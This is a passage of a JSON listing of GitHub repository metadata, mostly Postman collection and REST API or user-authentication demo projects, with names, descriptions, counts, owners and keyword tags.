[
  {
    "id": 58462109,
    "name": "postman-to-loadimpact",
    "full_name": "loadimpact/postman-to-loadimpact",
    "description": "DEPRECATED - Transform Postman collections to Load Impact Lua user scenarios",
    "fork": false,
    "created_at": "2016-05-10T13:07:11Z",
    "updated_at": "2020-02-11T08:51:18Z",
    "stargazers_count": 26,
    "watchers_count": 26,
    "forks": 9,
    "watchers": 26,
    "score": 1,
    "owner_id": 2271486,
    "owner_login": "loadimpact",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/2271486?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "collections",
      "form",
      "user",
      "pact",
      "scenario"
    ]
  },
  {
    "id": 171538075,
    "name": "sapbydesign-api-samples",
    "full_name": "SAP-samples/sapbydesign-api-samples",
    "description": "A set of Postman collections that enables users to consume SAP Business ByDesign web services.",
    "fork": false,
    "created_at": "2019-02-19T19:43:06Z",
    "updated_at": "2020-03-23T12:06:06Z",
    "stargazers_count": 24,
    "watchers_count": 24,
    "forks": 22,
    "watchers": 24,
    "score": 1,
    "owner_id": 50221243,
    "owner_login": "SAP-samples",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/50221243?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "collections",
      "service",
      "user",
      "sign",
      "services",
      "users",
      "consume",
      "enable",
      "enables"
    ]
  },
  {
    "user": "zprager",
    "repo": "mongo-express-auth-demo",
    "pulled": "User",
    "id": 130126405,
    "name": "mongo-express-auth-demo",
    "full_name": "zprager/mongo-express-auth-demo",
    "description": "Boiler plate for user authentication with bcrypt, jwt, mongo, and express from Heroku.   Postman routes included in root directory.  ",
    "fork": false,
    "created_at": "2018-04-18T21:56:24Z",
    "updated_at": "2019-06-10T22:14:45Z",
    "forks": 6,
    "open_issues": 1,
    "watchers": 3,
    "network_count": 6,
    "subscribers_count": 2,
    "owner_id": 3187655,
    "owner_login": "zprager",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/3187655?v=4",
    "owner_type": "User",
    "tags": [
      "user",
      "express",
      "mongo",
      " express",
      "auth",
      "route",
      "routes",
      "authentication",
      "plate",
      "included",
      "directory",
      "bcrypt"
    ]
  },
  {
    "user": "mgaby25",
    "repo": "django-postman-sample",
    "pulled": "User",
    "id": 51204791,
    "name": "django-postman-sample",
    "full_name": "mgaby25/django-postman-sample",
    "description": "Just a sample project of integrating postman with django-user-accounts using pinax-theme-bootstrap",
    "fork": false,
    "created_at": "2016-02-06T14:04:47Z",
    "updated_at": "2019-06-03T07:47:23Z",
    "forks": 3,
    "open_issues": 1,
    "watchers": 2,
    "network_count": 3,
    "subscribers_count": 1,
    "owner_id": 1752125,
    "owner_login": "mgaby25",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/1752125?v=4",
    "owner_type": "User",
    "tags": [
      " postman",
      "user",
      "sample",
      "boot",
      "rating",
      "account",
      "django",
      "accounts",
      "integrating",
      "theme",
      "pinax"
    ]
  },
  {
    "user": "SAP-samples",
    "repo": "service-ticket-intelligence-postman-collection-sample",
    "pulled": "Organization",
    "id": 158232397,
    "name": "service-ticket-intelligence-postman-collection-sample",
    "full_name": "SAP-samples/service-ticket-intelligence-postman-collection-sample",
    "description": "A Postman collection and environment template that enables users to consume the Service Ticket Intelligence machine learning service.",
    "fork": false,
    "created_at": "2018-11-19T13:58:24Z",
    "updated_at": "2020-03-12T23:24:48Z",
    "forks": 3,
    "open_issues": 0,
    "watchers": 0,
    "network_count": 3,
    "subscribers_count": 6,
    "owner_id": 50221243,
    "owner_login": "SAP-samples",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/50221243?v=4",
    "owner_type": "Organization",
    "tags": [
      "collect",
      "collection",
      "service",
      "user",
      "environment",
      "users",
      "learn",
      "plate",
      "learning",
      "template",
      "consume",
      "machine",
      "enable",
      "enables"
    ]
  },
  {
    "user": "MojoNetworksInc",
    "repo": "Postman-Collections",
    "pulled": "Organization",
    "id": 138158822,
    "name": "Postman-Collections",
    "full_name": "MojoNetworksInc/Postman-Collections",
    "description": "API collections created in Postman that Mojo Cloud users can modify and run by using the native Postman app.",
    "fork": false,
    "created_at": "2018-06-21T11:00:11Z",
    "updated_at": "2018-07-10T17:31:00Z",
    "forks": 2,
    "open_issues": 0,
    "watchers": 0,
    "network_count": 2,
    "subscribers_count": 3,
    "owner_id": 27687225,
    "owner_login": "MojoNetworksInc",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/27687225?v=4",
    "owner_type": "Organization",
    "tags": [
      "collect",
      "collection",
      "collections",
      "create",
      "user",
      "users",
      "native",
      "modify"
    ]
  },
  {
    "user": "dev-lav",
    "repo": "demo-postman",
    "pulled": "User",
    "id": 154191526,
    "name": "demo-postman",
    "full_name": "dev-lav/demo-postman",
    "description": null,
    "fork": false,
    "created_at": "2018-10-22T18:04:40Z",
    "updated_at": "2018-11-10T05:07:10Z",
    "forks": 2,
    "open_issues": 0,
    "watchers": 0,
    "network_count": 2,
    "subscribers_count": 1,
    "owner_id": 15838417,
    "owner_login": "dev-lav",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/15838417?v=4",
    "owner_type": "User",
    "tags": []
  },
  {
    "user": "johnnadratowski",
    "repo": "postman-repl",
    "pulled": "User",
    "id": 34995758,
    "name": "postman-repl",
    "full_name": "johnnadratowski/postman-repl",
    "description": "Postman repl uses IPython to present the user with an interface to communicate with APIs. It loads postman configuration data into global state, allowing for quick and easy communication with an API.",
    "fork": false,
    "created_at": "2015-05-03T18:14:46Z",
    "updated_at": "2019-11-29T10:47:13Z",
    "forks": 0,
    "open_issues": 2,
    "watchers": 3,
    "network_count": 0,
    "subscribers_count": 1,
    "owner_id": 2152043,
    "owner_login": "johnnadratowski",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/2152043?v=4",
    "owner_type": "User",
    "tags": [
      " postman",
      "data",
      "user",
      "load",
      "stat",
      "config",
      "face",
      "uses",
      "interface",
      "configuration",
      "repl",
      "communicate",
      "communication"
    ]
  },
  {
    "id": 158232397,
    "name": "service-ticket-intelligence-postman-collection-sample",
    "full_name": "SAP-samples/service-ticket-intelligence-postman-collection-sample",
    "description": "A Postman collection and environment template that enables users to consume the Service Ticket Intelligence machine learning service.",
    "fork": false,
    "created_at": "2018-11-19T13:58:24Z",
    "updated_at": "2020-03-12T23:24:48Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 3,
    "watchers": 0,
    "score": 1,
    "owner_id": 50221243,
    "owner_login": "SAP-samples",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/50221243?v=4",
    "tags": [
      "collect",
      "collection",
      "service",
      "user",
      "environment",
      "users",
      "learn",
      "plate",
      "learning",
      "template",
      "consume",
      "machine",
      "enable",
      "enables"
    ]
  },
  {
    "id": 138158822,
    "name": "Postman-Collections",
    "full_name": "MojoNetworksInc/Postman-Collections",
    "description": "API collections created in Postman that Mojo Cloud users can modify and run by using the native Postman app.",
    "fork": false,
    "created_at": "2018-06-21T11:00:11Z",
    "updated_at": "2018-07-10T17:31:00Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 2,
    "watchers": 0,
    "score": 1,
    "owner_id": 27687225,
    "owner_login": "MojoNetworksInc",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/27687225?v=4",
    "tags": [
      "collect",
      "collection",
      "collections",
      "create",
      "user",
      "users",
      "native",
      "modify"
    ]
  },
  {
    "id": 154191526,
    "name": "demo-postman",
    "full_name": "dev-lav/demo-postman",
    "description": null,
    "fork": false,
    "created_at": "2018-10-22T18:04:40Z",
    "updated_at": "2018-11-10T05:07:10Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 2,
    "watchers": 0,
    "score": 1,
    "owner_id": 15838417,
    "owner_login": "dev-lav",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/15838417?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 34995758,
    "name": "postman-repl",
    "full_name": "johnnadratowski/postman-repl",
    "description": "Postman repl uses IPython to present the user with an interface to communicate with APIs. It loads postman configuration data into global state, allowing for quick and easy communication with an API.",
    "fork": false,
    "created_at": "2015-05-03T18:14:46Z",
    "updated_at": "2019-11-29T10:47:13Z",
    "stargazers_count": 3,
    "watchers_count": 3,
    "forks": 0,
    "watchers": 3,
    "score": 1,
    "owner_id": 2152043,
    "owner_login": "johnnadratowski",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/2152043?v=4",
    "tags": [
      " postman",
      "data",
      "user",
      "load",
      "stat",
      "config",
      "face",
      "uses",
      "interface",
      "configuration",
      "repl",
      "communicate",
      "communication"
    ]
  },
  {
    "id": 117354989,
    "name": "postman_collections",
    "full_name": "philosowaffle/postman_collections",
    "description": null,
    "fork": false,
    "created_at": "2018-01-13T15:33:55Z",
    "updated_at": "2019-03-16T01:44:36Z",
    "stargazers_count": 3,
    "watchers_count": 3,
    "forks": 1,
    "watchers": 3,
    "score": 1,
    "owner_id": 7275041,
    "owner_login": "philosowaffle",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/7275041?v=4",
    "tags": []
  },
  {
    "id": 138978321,
    "name": "restapi-shopdb",
    "full_name": "nishthagoel99/restapi-shopdb",
    "description": "A rest api made for users signup,login and to order products and then later see their products. MongoDB database is used!",
    "fork": false,
    "created_at": "2018-06-28T06:52:39Z",
    "updated_at": "2018-06-28T06:54:43Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 31266528,
    "owner_login": "nishthagoel99",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/31266528?v=4",
    "pulled": 1,
    "tags": [
      "data",
      "rest",
      "database",
      "user",
      "sign",
      "users",
      "rest api",
      "product",
      "login",
      "order",
      "products",
      "signup"
    ]
  },
  {
    "id": 70236810,
    "name": "UserApi",
    "full_name": "JordanHood/UserApi",
    "description": "An API to manage a user persistence layer",
    "fork": false,
    "created_at": "2016-10-07T10:27:00Z",
    "updated_at": "2019-09-30T09:45:22Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 19878138,
    "owner_login": "JordanHood",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/19878138?v=4",
    "pulled": 1,
    "tags": [
      "user",
      "manage",
      "persistence"
    ]
  },
  {
    "id": 130126405,
    "name": "mongo-express-auth-demo",
    "full_name": "zprager/mongo-express-auth-demo",
    "description": "Boiler plate for user authentication with bcrypt, jwt, mongo, and express from Heroku.   Postman routes included in root directory.  ",
    "fork": false,
    "created_at": "2018-04-18T21:56:24Z",
    "updated_at": "2019-06-10T22:14:45Z",
    "stargazers_count": 3,
    "watchers_count": 3,
    "forks": 6,
    "watchers": 3,
    "score": 1,
    "owner_id": 3187655,
    "owner_login": "zprager",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/3187655?v=4",
    "pulled": 1,
    "tags": [
      "user",
      "express",
      "mongo",
      " express",
      "auth",
      "route",
      "routes",
      "authentication",
      "plate",
      "included",
      "directory",
      "bcrypt"
    ]
  },
  {
    "id": 28899066,
    "name": "postman",
    "full_name": "foonster/postman",
    "description": "Postman is a generic PHP processing script to the e-mail gateway that \n parses the results of any form and sends them to the specified users. This \n script has many formatting and operational options, most of which can be \n specified within a variable file \"_variables.php\" each form.\n",
    "fork": false,
    "created_at": "2015-01-07T04:59:40Z",
    "updated_at": "2018-07-26T21:34:17Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 1919734,
    "owner_login": "foonster",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/1919734?v=4",
    "pulled": 1,
    "tags": [
      "form",
      "file",
      "script",
      "user",
      "format",
      "mail",
      "operation",
      "send",
      "spec",
      "users",
      "result",
      "parse",
      "results",
      "variable",
      "within",
      "process",
      "many",
      "gateway",
      "variables",
      "sends",
      "generic",
      "operationa",
      "options",
      "parses"
    ]
  },
  {
    "id": 206959440,
    "name": "Postman",
    "full_name": "sharmacloud/Postman",
    "description": "A scheduling system written in python around the unofficial instagram_api to post images and videos to a user's instagram any time into the future.",
    "fork": false,
    "created_at": "2019-09-07T11:38:24Z",
    "updated_at": "2019-09-07T11:38:24Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 29721911,
    "owner_login": "sharmacloud",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/29721911?v=4",
    "pulled": 1,
    "tags": [
      "user",
      "python",
      "image",
      "written",
      "system",
      "images",
      "official",
      "around",
      "future",
      "video",
      "unofficial",
      "scheduling"
    ]
  },
  {
    "id": 213908942,
    "name": "postman",
    "full_name": "AnnRidel/postman",
    "description": null,
    "fork": false,
    "created_at": "2019-10-09T12:11:28Z",
    "updated_at": "2019-10-15T07:27:03Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 52773996,
    "owner_login": "AnnRidel",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/52773996?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 213877290,
    "name": "postmanager-mongo",
    "full_name": "leoleandrocin/postmanager-mongo",
    "description": "Node application to user's posts management",
    "fork": false,
    "created_at": "2019-10-09T09:33:12Z",
    "updated_at": "2019-10-09T09:48:40Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 52429128,
    "owner_login": "leoleandrocin",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/52429128?v=4",
    "pulled": 1,
    "tags": [
      "application",
      "user",
      "manage",
      "management",
      "posts"
    ]
  },
  {
    "id": 166613108,
    "name": "Postman_util",
    "full_name": "dantasmr/Postman_util",
    "description": null,
    "fork": false,
    "created_at": "2019-01-20T01:54:51Z",
    "updated_at": "2019-01-20T01:56:36Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 9520781,
    "owner_login": "dantasmr",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/9520781?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 85964368,
    "name": "Document-Management-System",
    "full_name": "andela-cofor/Document-Management-System",
    "description": "Document Management System: The system manages documents, users and user roles. Each document defines access rights; the document defines which roles can access it.",
    "fork": false,
    "created_at": "2017-03-23T15:14:27Z",
    "updated_at": "2018-08-07T22:57:07Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 2,
    "watchers": 1,
    "score": 1,
    "owner_id": 25608370,
    "owner_login": "andela-cofor",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/25608370?v=4",
    "pulled": 1,
    "tags": [
      "user",
      "document",
      "manage",
      "users",
      "system",
      "access",
      "right",
      "define",
      "documents",
      "role",
      "manages",
      "roles"
    ]
  },
  {
    "id": 193369800,
    "name": "server-auth",
    "full_name": "AlenaNik/server-auth",
    "description": "postman+express user sign-in/register/enteries ",
    "fork": false,
    "created_at": "2019-06-23T16:16:54Z",
    "updated_at": "2019-06-23T20:37:46Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 38886707,
    "owner_login": "AlenaNik",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/38886707?v=4",
    "pulled": 1,
    "tags": [
      "user",
      "express",
      "sign",
      "enter",
      "register"
    ]
  },
  {
    "id": 113223909,
    "name": "PostMan-API",
    "full_name": "pdebrah/PostMan-API",
    "description": "Github public users API ",
    "fork": false,
    "created_at": "2017-12-05T19:25:49Z",
    "updated_at": "2017-12-05T19:25:49Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 34255871,
    "owner_login": "pdebrah",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/34255871?v=4",
    "pulled": 1,
    "tags": [
      "user",
      "users",
      "public"
    ]
  },
  {
    "id": 139713568,
    "name": "RestfulAPI-using-Postman-",
    "full_name": "Manish6006/RestfulAPI-using-Postman-",
    "description": null,
    "fork": false,
    "created_at": "2018-07-04T11:35:38Z",
    "updated_at": "2018-07-04T11:39:21Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 31389477,
    "owner_login": "Manish6006",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/31389477?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 126506904,
    "name": "postman-api-tests-jenkins",
    "full_name": "pietrangelo/postman-api-tests-jenkins",
    "description": null,
    "fork": false,
    "created_at": "2018-03-23T15:49:25Z",
    "updated_at": "2018-03-23T17:51:11Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 1083308,
    "owner_login": "pietrangelo",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/1083308?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 226883581,
    "name": "Trello_Postman_Api_Tests",
    "full_name": "SvitlanaKarapugina/Trello_Postman_Api_Tests",
    "description": "Postman api tests for Trello. Create/Update/Delete Board, List; Search board and search on board; Upload user image (negative and positive TC), get board's members and add board stars. I used GET, POST, PUT and DELETE. Create Environment with needed values.",
    "fork": false,
    "created_at": "2019-12-09T13:54:48Z",
    "updated_at": "2020-03-26T14:30:24Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 19514624,
    "owner_login": "SvitlanaKarapugina",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/19514624?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "tests",
      "tests ",
      "user",
      "load",
      "star",
      "image",
      "need",
      "search",
      "ember"
    ]
  },
  {
    "id": 138647394,
    "name": "users_demo_api_postman_collection",
    "full_name": "kurtulussahin/users_demo_api_postman_collection",
    "description": "Postman-Travis integration demo - https://travis-ci.org/kurtulussahin/users_demo_api_postman_collection",
    "fork": false,
    "created_at": "2018-06-25T20:37:16Z",
    "updated_at": "2018-07-02T09:55:13Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 16954548,
    "owner_login": "kurtulussahin",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/16954548?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "http",
      "user",
      "https",
      "demo",
      "integration",
      "users",
      "travis"
    ]
  },
  {
    "id": 232752927,
    "name": "PostmanCollections1",
    "full_name": "sanellj/PostmanCollections1",
    "description": "Moj rad: Registracija, Kreiranje transfera, Lista svih registrovanih user-a, Login, Lista svih transfera, Delete trassfera",
    "fork": false,
    "created_at": "2020-01-09T07:51:57Z",
    "updated_at": "2020-01-09T07:53:27Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 41547691,
    "owner_login": "sanellj",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/41547691?v=4",
    "pulled": 1,
    "tags": [
      "user"
    ]
  },
  {
    "id": 226191398,
    "name": "postmanCollection_Runner",
    "full_name": "Miradel/postmanCollection_Runner",
    "description": null,
    "fork": false,
    "created_at": "2019-12-05T21:23:18Z",
    "updated_at": "2019-12-05T21:30:10Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 46764882,
    "owner_login": "Miradel",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/46764882?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 203248731,
    "name": "PostmanCollectionBuilder",
    "full_name": "Sailee91/PostmanCollectionBuilder",
    "description": null,
    "fork": false,
    "created_at": "2019-08-19T20:53:42Z",
    "updated_at": "2019-08-19T21:21:47Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 54291081,
    "owner_login": "Sailee91",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/54291081?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 155274207,
    "name": "cora-users-postman-collection",
    "full_name": "gabrielmadeirapessoa/cora-users-postman-collection",
    "description": "Coleção de requisições de exemplo para Postman para o projeto cora-users",
    "fork": false,
    "created_at": "2018-10-29T20:08:39Z",
    "updated_at": "2018-10-31T14:45:36Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 28993176,
    "owner_login": "gabrielmadeirapessoa",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/28993176?v=4",
    "pulled": 1,
    "tags": [
      "user",
      "users",
      "projeto",
      "projet",
      "exemplo"
    ]
  },
  {
    "id": 167336907,
    "name": "postman-ansibletower-collection",
    "full_name": "nehrman/postman-ansibletower-collection",
    "description": null,
    "fork": false,
    "created_at": "2019-01-24T09:05:53Z",
    "updated_at": "2019-01-24T09:05:56Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 12544810,
    "owner_login": "nehrman",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/12544810?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 246331892,
    "name": "Collection-for-Bugred.ru",
    "full_name": "zhurba-alina/Collection-for-Bugred.ru",
    "description": "postman collection for testing users.bugred.ru",
    "fork": false,
    "created_at": "2020-03-10T15:02:31Z",
    "updated_at": "2020-03-10T15:26:30Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 13964763,
    "owner_login": "zhurba-alina",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/13964763?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "collect",
      "collection",
      "testing",
      "postman collection",
      "user",
      "users"
    ]
  },
  {
    "id": 191825607,
    "name": "REST-API-final-project",
    "full_name": "kristaeis/REST-API-final-project",
    "description": "REST API featuring user account creation and authentication, reading lists, and books - Postman tests/environment",
    "fork": false,
    "created_at": "2019-06-13T20:02:06Z",
    "updated_at": "2019-06-13T20:15:00Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 28417063,
    "owner_login": "kristaeis",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/28417063?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "tests",
      "user",
      "environment",
      "auth",
      "list",
      "read",
      "authentication",
      "book",
      "account",
      "creation",
      "books",
      "reading",
      "lists",
      "featuring"
    ]
  },
  {
    "id": 144369040,
    "name": "rest-api-authentication",
    "full_name": "melitus/rest-api-authentication",
    "description": ":art: This is to demonstrate how to authenticate a user to use rest api endpoints",
    "fork": false,
    "created_at": "2018-08-11T08:33:21Z",
    "updated_at": "2018-09-03T20:37:42Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 5014464,
    "owner_login": "melitus",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/5014464?v=4",
    "pulled": 1,
    "tags": [
      "rest",
      "user",
      "auth",
      "endpoint",
      "points",
      "demo",
      "endpoints",
      "rest api",
      "demonstrate",
      "authenticate"
    ]
  },
  {
    "id": 135473441,
    "name": "P11-build-rest-api",
    "full_name": "TJaySteno/P11-build-rest-api",
    "description": "This REST API handles requests for a course rating website. Using MongoDB, stores the reviews users make on different courses.",
    "fork": false,
    "created_at": "2018-05-30T17:00:49Z",
    "updated_at": "2020-01-10T22:14:59Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 26858794,
    "owner_login": "TJaySteno",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/26858794?v=4",
    "pulled": 1,
    "tags": [
      "request",
      "requests",
      "user",
      "site",
      "users",
      "rent",
      "view",
      "course",
      "website",
      "rating",
      "store",
      "handle",
      "review",
      "reviews",
      "handles"
    ]
  },
  {
    "id": 138725378,
    "name": "profile",
    "full_name": "BaneleMlamleli/profile",
    "description": "Spring Boot application that will use REST API to create, read, update and delete a user profile",
    "fork": false,
    "created_at": "2018-06-26T10:58:01Z",
    "updated_at": "2019-04-25T02:28:10Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 29200010,
    "owner_login": "BaneleMlamleli",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/29200010?v=4",
    "pulled": 1,
    "tags": [
      "create",
      "file",
      "application",
      "user",
      "read",
      "update",
      "delete",
      "profile"
    ]
  },
  {
    "id": 94695810,
    "name": "node-todo-api",
    "full_name": "harshitbshah/node-todo-api",
    "description": "A todo REST API with user accounts and authentication using MongoDB, Mongoose ODM, Mocha.js, Postman.",
    "fork": false,
    "created_at": "2017-06-18T15:27:44Z",
    "updated_at": "2017-09-21T22:08:03Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 22331581,
    "owner_login": "harshitbshah",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/22331581?v=4",
    "pulled": 1,
    "tags": [
      "user",
      "auth",
      "authentication",
      "account",
      "todo",
      "accounts"
    ]
  },
  {
    "id": 174911082,
    "name": "Stores_REST_API",
    "full_name": "ChiragSoni95/Stores_REST_API",
    "description": "A REST API to access items, stores, user authentication.",
    "fork": false,
    "created_at": "2019-03-11T02:26:45Z",
    "updated_at": "2019-03-11T02:36:44Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 32116674,
    "owner_login": "ChiragSoni95",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/32116674?v=4",
    "pulled": 1,
    "tags": [
      "user",
      "auth",
      "authentication",
      "store",
      "access",
      "items"
    ]
  },
  {
    "id": 211506296,
    "name": "movie_rating_drf",
    "full_name": "Sayam753/movie_rating_drf",
    "description": "A django rest based web app for handling movie_ratings for different users.",
    "fork": false,
    "created_at": "2019-09-28T13:39:54Z",
    "updated_at": "2020-01-12T05:28:20Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 43073325,
    "owner_login": "Sayam753",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/43073325?v=4",
    "pulled": 1,
    "tags": [
      "rest",
      "user",
      "based",
      "users",
      "rent",
      "rating",
      "web app",
      "handling",
      "django",
      "movie",
      "django rest"
    ]
  },
  {
    "id": 162643106,
    "name": "REST-employeeApp",
    "full_name": "Marqueb82/REST-employeeApp",
    "description": "RESTful web service created using spring and tested with Postman.  Uses general get and post requests for mapping and service will allow user to add, remove, view all and view specific employess based upon their ID.",
    "fork": false,
    "created_at": "2018-12-20T23:50:03Z",
    "updated_at": "2019-02-06T05:53:05Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 33797265,
    "owner_login": "Marqueb82",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/33797265?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "create",
      "request",
      "service",
      "requests",
      "user",
      "based",
      "tested",
      "spec",
      "view",
      "spring",
      "specific",
      "general",
      "upon"
    ]
  },
  {
    "id": 191698993,
    "name": "REST-API",
    "full_name": "cmullins777/REST-API",
    "description": "A school database where registered users can retrieve, add, update, and delete courses in the database. This project uses REST API design, Node.js, and Express to create API routes, and the Sequelize ORM for data modeling, validation, and persistence, as well as Postman for testing.",
    "fork": false,
    "created_at": "2019-06-13T05:50:42Z",
    "updated_at": "2019-11-18T23:55:03Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 15165828,
    "owner_login": "cmullins777",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/15165828?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "create",
      "data",
      "testing",
      "database",
      "user",
      "sign",
      "route",
      "routes",
      "users",
      "update",
      "course",
      "delete",
      "uses",
      "model",
      "design",
      "validation",
      "retrieve",
      "register",
      "persistence",
      "school",
      "modeling"
    ]
  },
  {
    "id": 223085769,
    "name": "url-shortener-api",
    "full_name": "Fantaso/url-shortener-api",
    "description": "Url shortener API with Django and django rest framework. Project consists to allow a user to transform a long web url into a pattern-consistent (encoded) small url easy to share and remember.",
    "fork": false,
    "created_at": "2019-11-21T04:08:56Z",
    "updated_at": "2019-12-05T20:44:24Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 29681368,
    "owner_login": "Fantaso",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/29681368?v=4",
    "pulled": 1,
    "tags": [
      "form",
      "rest",
      "user",
      "code",
      "framework",
      "long",
      "small",
      "django",
      "transform",
      "consist",
      "ember",
      "django rest",
      "shortener"
    ]
  },
  {
    "id": 175444053,
    "name": "todo-api",
    "full_name": "pranshugarg/todo-api",
    "description": "Made REST APIs wherein user can add, delete, update to-do list with user account and authentication. Technologies used: Node.js, mongoDB , postman",
    "fork": false,
    "created_at": "2019-03-13T15:04:28Z",
    "updated_at": "2019-10-02T23:47:17Z",
    "stargazers_count": 0,
    "watchers_count": 0,
